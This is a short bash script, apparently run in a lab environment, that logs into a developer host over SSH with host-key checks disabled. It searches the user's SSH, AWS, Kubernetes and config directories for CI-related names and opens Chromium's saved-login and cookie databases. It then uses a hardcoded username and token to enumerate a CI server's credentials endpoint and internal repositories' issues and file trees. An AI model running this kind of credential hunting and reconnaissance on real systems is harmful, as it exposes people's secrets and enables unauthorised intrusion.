set +e
CA=/home/rowan/.local/share/keplerops/ca.crt
CRED='rowan.ito:fk_developer_yUWTKSqrc16y3K5_5DfQ7qacft9b-9xo'
S="ssh -o BatchMode=yes -o StrictHostKeyChecking=no rowan-dev"
run(){ echo "===== $1 ====="; $S "$1" 2>&1; echo; }
run 'grep -Ril "buildops\|build_operations\|build-operations\|ci-automation\|runner-command\|runner-operations" ~/.config ~/.local ~/.npm ~/.ssh ~/.kube ~/.aws 2>/dev/null | head -40; echo ---; grep -Rin "buildops\|build_operations\|build-operations\|ci-automation\|runner-command\|runner-operations" ~/.config ~/.local ~/.ssh ~/.kube ~/.aws 2>/dev/null | head -60'
run 'ls -la ~/.config/chromium/Default 2>/dev/null | head -30; which sqlite3; for f in "History" "Login Data" "Cookies"; do echo "### $f"; [ -f ~/.config/chromium/Default/"$f" ] && sqlite3 ~/.config/chromium/Default/"$f" ".tables" 2>&1 | head -3; done'
run 'for U in /credentials/ /user/rowan.ito/credentials/ /asynchPeople/api/json /user/ci-automation/api/json /user/build-operations/api/json /me/api/json; do echo "### $U"; curl -sS -m 10 -g --cacert '"$CA"' -u '"$CRED"' "https://ci.keplerops.test$U" | head -c 1500; echo; done'
run 'for R in fieldlink-connector connector-archive policy-compiler release-signer-history; do echo "### ISSUES $R"; curl -sS -m 10 -g --cacert '"$CA"' -u '"$CRED"' "https://source.keplerops.test/api/v1/repos/fieldkest/$R/issues?state=all&limit=20" | head -c 3000; echo; done'
run 'echo "### policy-compiler tree"; curl -sS -m 10 -g --cacert '"$CA"' -u '"$CRED"' "https://source.keplerops.test/api/v1/repos/fieldkest/policy-compiler/git/trees/main?recursive=1" | python3 -c "import sys,json;d=json.load(sys.stdin);print(chr(10).join(x[\"path\"] for x in d.get(\"tree\",[])))" 2>&1 | head -80'
